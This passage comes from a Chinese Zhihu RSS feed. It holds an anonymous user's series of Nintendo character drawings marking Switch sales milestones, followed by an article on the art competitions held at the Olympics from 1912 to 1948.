data-private-watermark-src=\"v2-350f7ba3a744abf92073941d56990587\"></p>\n<p>5700万突破的大库巴。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-3480d71eab7a33d784c3ae5c7ccf73c2_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-3480d71eab7a33d784c3ae5c7ccf73c2\" data-watermark-src=\"v2-43671d455892d4f7c17649c8f35c3ef6\" data-private-watermark-src=\"v2-fc50e92beba929d596921cbc51184ba3\"></p>\n<p>5800万突破的初代塞尔达公主。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-b699e71ff18611272d87c9dab241f365_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-b699e71ff18611272d87c9dab241f365\" data-watermark-src=\"v2-5b4694e35ff429dab96642d2933fba0d\" data-private-watermark-src=\"v2-05ff01512c1c3b5fa32a4c48d6c27d19\"></p>\n<p>5900万突破的……“公主在另一个城堡”</p>\n<p><img src=\"https://pic4.zhimg.com/v2-ac4d4dff3b84870f453a689bbcd12f2f_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-ac4d4dff3b84870f453a689bbcd12f2f\" data-watermark-src=\"v2-2a084da290cd5f0d9576cbe3877ab809\" data-private-watermark-src=\"v2-c7fffa18dc06036fbabd43e6e1339f15\" data-tags=\"politic\"></p>\n<p>6000万突破的DONKEY KONG X 凑阿夸</p>\n<p><img src=\"https://pic2.zhimg.com/v2-75d04349ee9d4784f55eadb4ab8eafca_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-75d04349ee9d4784f55eadb4ab8eafca\" data-watermark-src=\"v2-47f2a86f52169155ba5bb33081fbfb44\" data-private-watermark-src=\"v2-189e7b375401321be63bc50717a90aec\"></p>\n<p>6100万突破的《MOTHER》初代主角：NINTEN</p>\n<p><img src=\"https://pic1.zhimg.com/v2-f566941b5a0bacd5c09a8b69a1b4ca89_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-f566941b5a0bacd5c09a8b69a1b4ca89\" data-watermark-src=\"v2-0f343fb74aa79ef9222140944ede4f86\" data-private-watermark-src=\"v2-ab8892c93527abbfe8c7161e69bea803\"></p>\n<p>任天堂新财报出炉，硬件销量累计6830万台。</p>\n<p>因为这次有人提醒所以提前几天就画了……到家后传上来吧。</p>\n<p>这次我猜得挺准的……</p>\n<p>6200万突破的卡比（卡比的造型是真好画啊……）</p>\n<p><img src=\"https://pic3.zhimg.com/v2-4803c93cc89ab7038c0e50efcabcf284_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-4803c93cc89ab7038c0e50efcabcf284\" data-watermark-src=\"v2-05307b92cfd5cd1ec15163ac2fd10706\" data-private-watermark-src=\"v2-77bec68f4d48ddeb9e64d6b9889ee2ef\"></p>\n<p>6300万突破的马里奥系列经典家门怪酷栗宝。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-3016f768a9d2caa844ad73888afb9bba_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-3016f768a9d2caa844ad73888afb9bba\" data-watermark-src=\"v2-4aaf71c3a15df5f274d1609204799d0e\" data-private-watermark-src=\"v2-aff026e2ef5922fc1b5dc340bb9eedcb\"></p>\n<p>6400万突破的塞尔达传说系列人气角色……汀格尔（不过气球装的来源是DS上的汀格尔气球大战）</p>\n<p><img src=\"https://pic2.zhimg.com/v2-f44b617999b0a5fd1955a4970bba2d4c_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-f44b617999b0a5fd1955a4970bba2d4c\" data-watermark-src=\"v2-9a88e892a4097e9b1b0ae448df9e88ea\" data-private-watermark-src=\"v2-f639da87b33cf41809fbf8148251ca7d\"></p>\n<p>6500万突破的火焰之纹章初代男主马尔斯。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-4fc800703398b2206fc5b0f0b6832665_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-4fc800703398b2206fc5b0f0b6832665\" data-watermark-src=\"v2-44fecc7621f294be30e695c0c455631b\" data-private-watermark-src=\"v2-9ee0629b4f51859c72a4007b95ab209f\"></p>\n<p>6600万突破的塞尔达传说风之杖的BOSS加农。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-eb9869674e2a8829c733e496254c98b0_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-eb9869674e2a8829c733e496254c98b0\" data-watermark-src=\"v2-f0a86545a27a07766da8008c3c48672f\" data-private-watermark-src=\"v2-e668ab9e0e768590bf17ecf7eff1b04b\"></p>\n<p>6700万突破的银河战士系列主角萨姆斯。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-81e3fe5406082c4c3eeb50a962907a8f_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-81e3fe5406082c4c3eeb50a962907a8f\" data-watermark-src=\"v2-55eec70f197b516504dca4c76d2a9658\" data-private-watermark-src=\"v2-3e2f1cc0417f0ead4bfc87a202140399\"></p>\n<p>6800万突破的马里奥系列老二哥路易。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-c867c6fd6d65b4cbfe181a31cf1d2e68_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-c867c6fd6d65b4cbfe181a31cf1d2e68\" data-watermark-src=\"v2-cb561b7ec9113cbbcecc0f9b22a08f62\" data-private-watermark-src=\"v2-c9a298d2a93c72d3c6f135c4051d26f6\"></p>\n<p>任天堂新财报出炉，硬件销量累计7987万台。</p>\n<p>虽然提前画了些但少估了200万，到家后快点画完补上两张……</p>\n<p>6900万突破的马里奥系列经典怪德哥（其实叫锤子兄弟……）</p>\n<p><img src=\"https://pic4.zhimg.com/v2-8b2f990ffec63361f15bd33026411289_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-8b2f990ffec63361f15bd33026411289\" data-watermark-src=\"v2-e52ac808c5436d3e2f3de80d209f0b64\" data-private-watermark-src=\"v2-65bbca677355c656e282506641a2a306\"></p>\n<p>7000万突破的老娘经典怪星人</p>\n<p><img src=\"https://pic1.zhimg.com/v2-0d1c6548698743b1ef4c4287603c64cd_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-0d1c6548698743b1ef4c4287603c64cd\" data-watermark-src=\"v2-cd1a2522295b09ea4464f0e3300577cb\" data-private-watermark-src=\"v2-ad4dbba6397b9f6335b3a183fd8fb99e\"></p>\n<p>7100万突破的纸马折纸王国的炸弹彬</p>\n<p><img src=\"https://pic4.zhimg.com/v2-226f2adb536326398924c042bbb75602_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-226f2adb536326398924c042bbb75602\" data-watermark-src=\"v2-b391eeeab09d63f2b6f4e06e0a34e4f0\" data-private-watermark-src=\"v2-4a5afc5a0f16cfea629c8010b4d2ec9c\"></p>\n<p>7200万突破的F-ZERO猎鹰队长</p>\n<p><img src=\"https://pic4.zhimg.com/v2-ac4847300494463862f509f3cbf9c5d2_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-ac4847300494463862f509f3cbf9c5d2\" data-watermark-src=\"v2-adbd433b35e540fb347ba458cb07c75b\" data-private-watermark-src=\"v2-2814d104d864e374c1980d59d9f5b5c9\"></p>\n<p>7300万突破的口袋妖怪经典PM鲤鱼王</p>\n<p><img src=\"https://pic4.zhimg.com/v2-1e278a6a9f60a043bbbb7857a927edf3_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-1e278a6a9f60a043bbbb7857a927edf3\" data-watermark-src=\"v2-11f2f41b0bb6487694ac3475f889fa7d\" data-private-watermark-src=\"v2-2504c7a60907cfb9a886c05a7288404f\"></p>\n<p>7400万突破的魔法假日女主角</p>\n<p><img src=\"https://pic4.zhimg.com/v2-575443f7856df5a41c3126730b52102a_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-575443f7856df5a41c3126730b52102a\" data-watermark-src=\"v2-b351c118ae00d047f9ca4c16084d86eb\" data-private-watermark-src=\"v2-d814264ddea00c0c4b3768e5b7fa97b0\"></p>\n<p>7500万突破的塞尔达时之笛傲娇佐拉小公主露塔</p>\n<p><img src=\"https://pic2.zhimg.com/v2-d7f34f8247ff89807684c4a587bc6eb4_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-d7f34f8247ff89807684c4a587bc6eb4\" data-watermark-src=\"v2-45c1ebafe29ac4a705d870b80416d8a2\" data-private-watermark-src=\"v2-9eccac143414d4a8978d64b1ec8072cd\"></p>\n<p>7600万突破的口袋妖怪PM 巨钳螳螂</p>\n<p><img src=\"https://pic2.zhimg.com/v2-fb76ae1344f27a277a0dc219d1c0e323_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-fb76ae1344f27a277a0dc219d1c0e323\" data-watermark-src=\"v2-e88360ee0d8a0fea1e9700e2182d02d6\" data-private-watermark-src=\"v2-8a380a6430863c1ffee7c6134ca33836\"></p>\n<p>7700万突破的动物之森恶毒资本家狸克</p>\n<p><img src=\"https://pic2.zhimg.com/v2-3a0becf83c4f72e574f361e50e78b34d_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-3a0becf83c4f72e574f361e50e78b34d\" data-watermark-src=\"v2-edf5e367e272d180696c5ba4ab650bf3\" data-private-watermark-src=\"v2-78ace80e99951ca815f1d7e9be2b3a9f\"></p>\n<p>7800万突破的皮克敏主角奥利马</p>\n<p><img src=\"https://pic4.zhimg.com/v2-71e28f8a0385653c4bd5fe662b7a2930_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-71e28f8a0385653c4bd5fe662b7a2930\" data-watermark-src=\"v2-5c39930229a2fb2f84ab0fb6dc42d29f\" data-private-watermark-src=\"v2-0b4139cb2baa1a72f4b89535bcba2237\"></p>\n<p>7900万突破的黄金太阳米雅莉</p>\n<p><img src=\"https://pic2.zhimg.com/v2-4127f601aab0aa6a957275417cb2484a_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-4127f601aab0aa6a957275417cb2484a\" data-watermark-src=\"v2-4ae487bb7391aea965d9fe40e010dd06\" data-private-watermark-src=\"v2-dc881b0ee2444af0c2fa03a2d344868d\"></p>\n<p>……躺着也赚爆，ND还会开吗。</p>\n<p> 任天堂财报出炉，截止2021年3月31日：NS硬件销量累计8459万台。</p>\n<p>最近痛风（不是MHR）中只能保持着一个难受的姿势画图，没什么耐心就偷了一些工……</p>\n<p>8000万突破的马里奥系列的黛西公主。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-2b1107350eb990c83225ee4f616e0202_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-2b1107350eb990c83225ee4f616e0202\" data-watermark-src=\"v2-a0486a36b1dccaf4efc199ec31f65d1e\" data-private-watermark-src=\"v2-90bcb7669e244cbaa419957b98de4186\"></p>\n<p>8100万突破的健身环BOSS堕拉贡，顺便庆贺健身环突破1000万销量。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-dc89fc783f84f45405a049b65593e926_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1100\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-dc89fc783f84f45405a049b65593e926\" data-watermark-src=\"v2-4a6d9eba1d4fdd222091e0d684483737\" data-private-watermark-src=\"v2-d03dbb1f838f5d4448284212ffed6c27\"></p>\n<p>8200万突破的口袋妖怪大朝北鼻</p>\n<p><img src=\"https://pic2.zhimg.com/v2-f71f639f10888c3781d5d938aee51718_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-f71f639f10888c3781d5d938aee51718\" data-watermark-src=\"v2-6170a25880e687ef62a8ada01da4a324\" data-private-watermark-src=\"v2-37ba9ea174ce13053c19a3c1bbc33922\"></p>\n<p>8300万突破的迪迪刚</p>\n<p><img src=\"https://pic1.zhimg.com/v2-48a68a8f1a13c99de91f55b962c6616b_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-48a68a8f1a13c99de91f55b962c6616b\" data-watermark-src=\"v2-eb1e481256fcfb6ff74d1c139b30783d\" data-private-watermark-src=\"v2-946769d6fbfc45f44a13872cb77d3687\"></p>\n<p>8400万突破的火纹初代女主希达</p>\n<p><img src=\"https://pic2.zhimg.com/v2-f1d6481f538b2d400c7d1d4fbe65980e_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-f1d6481f538b2d400c7d1d4fbe65980e\" data-watermark-src=\"v2-8a542c9eb9fd526432313aa4313599a8\" data-private-watermark-src=\"v2-35da410d847903c36d70c7c03bdac238\"></p>\n<p>该忏悔了……</p>\n<p>任天堂财报出炉，截止2021年6月30日：NS硬件销量累计8904万台。</p>\n<p>这次有之前多画的凑数，倒是省事……</p>\n<p>8500万突破的零装萨姐</p>\n<p><img src=\"https://pic3.zhimg.com/v2-5f2b2f55f11a627558080182c5ef7eb4_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-5f2b2f55f11a627558080182c5ef7eb4\" data-watermark-src=\"v2-9ce5618b77239810a63041682f53d18b\" data-private-watermark-src=\"v2-bc6166d27a756bb07139b9865dfd83d5\"></p>\n<p>8600万突破的马里奥系列炮弹刺客</p>\n<p><img src=\"https://pic2.zhimg.com/v2-8e716ed1ecb8ea2439acc0a39ccfdf3b_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-8e716ed1ecb8ea2439acc0a39ccfdf3b\" data-watermark-src=\"v2-f6745518de669ccc4d63fa490499c0d1\" data-private-watermark-src=\"v2-869e94fce98da02f7b0eb847accf3121\"></p>\n<p>8700万突破的金属之光主角老妹日向梓</p>\n<p><img src=\"https://pic3.zhimg.com/v2-55557db03287da3fdde7cfe83a21ee4d_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-55557db03287da3fdde7cfe83a21ee4d\" data-watermark-src=\"v2-f2ba8b2c7b7c006c73c963d9cae0b286\" data-private-watermark-src=\"v2-1c8738f450b05cb665b410f86de18304\"></p>\n<p>8800万突破的赫拉克罗斯</p>\n<p><img src=\"https://pic2.zhimg.com/v2-433f189074bc85d487d260c8b2c3a9de_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-433f189074bc85d487d260c8b2c3a9de\" data-watermark-src=\"v2-c21118e69d7de503ef0128763e490da7\" data-private-watermark-src=\"v2-958bbdc57fff20166edfd779cec3417c\"></p>\n<p>8900万突破的面具商人（这个角色真是塞尔达系列里最让我感觉渗人的……某种意义上的童年阴影）</p>\n<p><img src=\"https://pic4.zhimg.com/v2-cbf965782065bc781bc2f655b2a95ab7_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-cbf965782065bc781bc2f655b2a95ab7\" data-watermark-src=\"v2-0d5a9b7de29293b5e3807e3741a9bbf8\" data-private-watermark-src=\"v2-d83c9587d4b538306efb20b796130bc3\"></p>\n<p>这次硬件销量同比缩水，爆杀古川，该来点大的了吧！（但其实是去年动森太猛了，恐怕古川还要继续躺……）</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/question/266492999/answer/309613424?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\">匿名用户</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/266492999/answer/309613424?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">190 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/297478327?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价switch2019年推出的升级版？</a><br><a href=\"http://www.zhihu.com/question/286061729?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">年龄大了玩 Switch 什么感受？</a><br>\n","link":"http://www.zhihu.com/question/266492999/answer/309613424?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"如果艺术家也能角逐奥运金牌……","date":"2021-08-05 09:34:13","description":"\n<p>1908年奥运会，沃尔特·威南斯代表美国队出赛，赢得了射击项目金牌。他在1912年又一次参加奥运会，并且除射击之外，还参加了另一个项目，并赢得金牌。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-4bd68a2985b71c5478c830a107ea4d9c_b.jpg\" data-size=\"normal\" data-rawwidth=\"2048\" data-rawheight=\"1532\" class=\"origin_image zh-lightbox-thumb\" width=\"2048\" data-original=\"https://pic1.zhimg.com/v2-4bd68a2985b71c5478c830a107ea4d9c_r.jpg\"><figcaption>沃尔特·威南斯</figcaption></figure><p>问：沃尔特·威南斯参加的是什么项目？</p>\n<ul>\n<li>A，马术</li>\n<li>B，游泳</li>\n<li>C，唱歌</li>\n<li>D，雕塑</li>\n</ul>\n<p>要是按照以往做选择题的经验，我们肯定先排除两个明显和题干奥运会无关的选项唱歌和雕塑，然后再考虑，射击、游泳和马术都包含在现代五项里面，不太好选，但看照片这位老人家颇有一幅西部片里面警长的样子，肯定会骑马，不一定会游泳，所以答案应该是A，马术？</p>\n<p>很遗憾，答案是D。他的金牌的确和马有关，但并不是马术，而是……一件青铜雕塑——《美国快步马》。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-6e44049c1415a841c8b07be4c6f9e3b5_b.jpg\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" class=\"origin_image zh-lightbox-thumb\" width=\"1920\" data-original=\"https://pic2.zhimg.com/v2-6e44049c1415a841c8b07be4c6f9e3b5_r.jpg\"><figcaption>沃尔特·威南斯，《美国快步马》</figcaption></figure><p>是的，当年的奥运会，曾经是比雕塑的。而且不光有雕塑，还有绘画、建筑、音乐和文学，一比就是几十年。</p>\n<p>在奥运会搞艺术大奖赛这事儿确实不是瞎折腾，而是现代奥林匹克运动会的创始人皮埃尔·德·顾拜旦的主意。早在1894年头一回奥运会之后，顾拜旦就觉得不过瘾，不够劲儿。他觉得世界大同光靠体育的交流还是不够，还需要有心灵的交流，心灵交流就要靠艺术。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-f129afa6e23db35f40989472ba6491e6_b.jpg\" data-size=\"normal\" data-rawwidth=\"684\" data-rawheight=\"965\" class=\"origin_image zh-lightbox-thumb\" width=\"684\" data-original=\"https://pic3.zhimg.com/v2-f129afa6e23db35f40989472ba6491e6_r.jpg\"><figcaption>顾拜旦男爵皮埃尔·德·弗雷迪</figcaption></figure><figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-2af535af5806ccb2a9015d0416781315_b.jpg\" data-size=\"normal\" data-rawwidth=\"684\" data-rawheight=\"767\" class=\"origin_image zh-lightbox-thumb\" width=\"684\" data-original=\"https://pic2.zhimg.com/v2-2af535af5806ccb2a9015d0416781315_r.jpg\"><figcaption>顾拜旦的《奥林匹克宣言》手稿于2019年经苏富比拍卖，以6160万元成交。</figcaption></figure><p>于是，当1912年斯德哥尔摩承办奥运会的时候，顾拜旦就说，咱那些体育项目：田径、体操、帆船、马术……照常比，再加几条艺术的呗。斯德哥尔摩一开始是很不情愿的，但是最终还是同意增设绘画、雕塑、建筑、音乐、文学五个领域，各设金银铜牌。舞蹈、电影和摄影等形式一度也被纳入考量范围，但最终没有被采纳。参赛作品的体裁不限，但有一个要求——必须呼应体育运动主题和奥林匹克精神。</p>\n<p>这就有了前面咱们说的双料冠军沃尔特·威南斯，一个人赢下射击和雕塑两项金牌的逸事了。不过，老实说咱们这位奥运金牌得主并不是特别有名的艺术家，他的雕塑作品也是中规中矩。之所以他赢得金牌，其实也是矮子里面拔高个，第一届有艺术赛事的奥运会，五个项目加起来，才总共只有35人报名参加，按最终颁发15枚奖牌计算，等于每两个半人就能匀到一枚奖牌，竞争激烈程度比跑步、跳高可是低多了。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-469b0713b53bb1afcd9a2eb475b54325_b.jpg\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"1082\" class=\"origin_image zh-lightbox-thumb\" width=\"800\" data-original=\"https://pic2.zhimg.com/v2-469b0713b53bb1afcd9a2eb475b54325_r.jpg\"><figcaption>1912年斯德哥尔摩奥运会海报，图画作者为奥洛夫·霍茲伯格，他的这幅画并没有参赛获奖</figcaption></figure><p>虽说一开始艺术赛事的热度不高，但顾拜旦并不打算就此打住。在接下来的几十年里，艺术赛事的参与度逐年增高，到1924年的时候，已经有193位各界艺术家参赛了，而竞赛项目也开始细分，绘画分出了油画、水彩素描、版画；建筑奖项分成两项：建筑和城市规划。只不过这两个类别有时候实在很难区分，有时候干脆会把这两个奖颁给同一个建筑作品。</p>\n<p>文学分出了戏剧、史诗和诗歌——这项赛事的参赛者必须使用英语或者法语参赛。有意思的是，咱们的顾拜旦爵爷为了炒高比赛热度，还曾使用化名乔治·欧罗德和马丁·艾芬巴赫参加诗歌项目赛事，最后乔治·欧罗德还真的赢了一枚金牌。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-a6a828dfff444c76015fdc9e646560bc_b.jpg\" data-size=\"normal\" data-rawwidth=\"320\" data-rawheight=\"320\" class=\"content_image\" width=\"320\"><figcaption>1924年巴黎奥运会金牌，可以看到左下角包含有竖琴等和艺术有关的元素</figcaption></figure><p>音乐赛事虽然分出了管弦乐、独奏和人声，但其实这些作品都是以乐谱的形式递交给组委会的，并不是像今天的选秀节目那样由乐手现场表演给评委。尽管评委们并非等闲之辈——音乐赛事评委中包括有伊戈尔·斯特拉文斯基这样的乐坛传奇，文学评委包括诺贝尔文学奖得主塞尔玛·拉格洛夫等，但在面对这「一页页」奥运选手时，评委们难免因艺术主张的分歧而难以达成共识。事实上，斯特拉文斯基担任音乐赛事评委的1924年奥运会根本没有颁发任何音乐奖牌。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-f02397d5e205aebfd5dc3af966ec2294_b.jpg\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"967\" class=\"origin_image zh-lightbox-thumb\" width=\"800\" data-original=\"https://pic1.zhimg.com/v2-f02397d5e205aebfd5dc3af966ec2294_r.jpg\"><figcaption>斯特拉文斯基的作品如《火鸟》、《春之祭》至今仍会在奥运会花样滑冰等赛事的配乐中出现</figcaption></figure><p>当然，颁不出奖一个原因可能是评委的标准高，另一个原因也是因为很多名声在外的艺术大师不太愿意参赛。这一时期咱们能叫得出名字的那些艺术家，比如毕加索、马蒂斯……全都没参加奥运会。一些艺术家不愿意和其他自己看不上的艺术家同台竞技，另有些艺术家不太愿意迎合奥运会的套路去命题作文——很多参加绘画赛事的艺术家为了能够吸引评委的眼球，都会选择绘制紧张刺激的拳击、橄榄球等主题作品。历史上唯一一位两届奥运会绘画金牌得主让·雅可比的得奖作品便是描绘足球运动中前锋和守门员争球的《角球》和橄榄球运动员激烈拼抢的《橄榄球》。它们为他分别赢得了一枚综合绘画金牌和素描金牌。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-277013288ed3e3fed98dc50cd88eda8a_b.jpg\" data-size=\"normal\" data-rawwidth=\"448\" data-rawheight=\"700\" class=\"origin_image zh-lightbox-thumb\" width=\"448\" data-original=\"https://pic3.zhimg.com/v2-277013288ed3e3fed98dc50cd88eda8a_r.jpg\"><figcaption>让·雅可比，《角球》</figcaption></figure><p>因为上述种种原因，参加奥运会的艺术家们，与其说是艺术家，不如说是「符合奥运精神的资深艺术爱好者」。毕竟，早年间的奥运会非常强调「奥运精神第一，比赛成绩第二」，职业艺术家多仰赖销售作品为生，而奥运会又不想参赛者和钱挂钩，尤其是不想看到赢了金牌的艺术家作品价格变贵。所以当激进的保守派奥委会主席艾弗里·布伦戴奇上任后，他坚持要维护奥运会的纯洁，并力主将全部艺术赛事一次性开除出了奥运会——即便他自己也曾在1932年参与了奥运文学奖的赛事（并没有获得奖牌）。从那以后，这些艺术赛事就再也没有回归奥运大家庭。</p>\n<p>从1912年到1948年的7届奥运会中，总共有23个国家的艺术家赢得了总计147枚奖牌，其中获奖最少的国家是摩纳哥，1枚铜牌，意大利和法国这两个文化大国在金牌榜和总奖牌榜上均并列第二，分别是5枚金牌和14枚奖牌。最终赢得7届奥运会艺术项目金牌和奖牌最多的并不是如今奥运会的大热门中国、美国和俄罗斯，而是德国，他们总共赢得了7金、7银、9铜，总计23枚奖牌。在最后一届包含艺术奖项的奥运会，1948年伦敦奥运会上，英国版画家约翰·科普利以73岁高龄赢得了版画银牌，成为了奥运史上年龄最大的奖牌获得者。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-faefbcfeffcc484783efc4ba80f547cc_b.jpg\" data-size=\"normal\" data-rawwidth=\"1280\" data-rawheight=\"850\" class=\"origin_image zh-lightbox-thumb\" width=\"1280\" data-original=\"https://pic1.zhimg.com/v2-faefbcfeffcc484783efc4ba80f547cc_r.jpg\"><figcaption>蔡国强主持创作的「大脚印」是08奥运开幕式最早敲定下来的方案之一</figcaption></figure><p>奥运艺术赛事虽然就此打住了，却以另一种形式延续了下来，那就是花样翻新的开幕式和闭幕式。单就在北京举办的2008年夏季奥运会的开幕式来说，就是众多资深艺术工作者合力的成果。除了广为人知的总导演张艺谋，副导演张继钢、陈维亚管的是各种繁杂的事情。樊跃、王潮歌的大型空间演出经验丰富，蔡国强（大脚印焰火），陈丹青（滚动画轴），陈岩和韩立勋（美术总设计）、陈其钢（音乐）……等等。</p>\n<p>去年年底我在故宫看了蔡国强的个展「远行与归来」，里面有他以故宫收藏的《冰嬉图》为灵感创作的《银河嬉冰》，他也会继续为2022年冬奥会出工出力。或许咱可以借此想象，如果现在的奥运会还有艺术赛事，艺术家们会带来什么样的作品。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-f703869f85101a7c16748dde2876f4f0_b.jpg\" data-size=\"normal\" data-rawwidth=\"4032\" data-rawheight=\"2520\" class=\"origin_image zh-lightbox-thumb\" width=\"4032\" data-original=\"https://pic1.zhimg.com/v2-f703869f85101a7c16748dde2876f4f0_r.jpg\"><figcaption>蔡国强的《银河嬉冰》</figcaption></figure><figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-4d6f0abd0bf5851033560660f9579bdf_b.jpg\" data-size=\"normal\" data-rawwidth=\"512\" data-rawheight=\"342\" class=\"origin_image zh-lightbox-thumb\" width=\"512\" data-original=\"https://pic4.zhimg.com/v2-4d6f0abd0bf5851033560660f9579bdf_r.jpg\"><figcaption>《银河嬉冰》局部</figcaption></figure><p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a 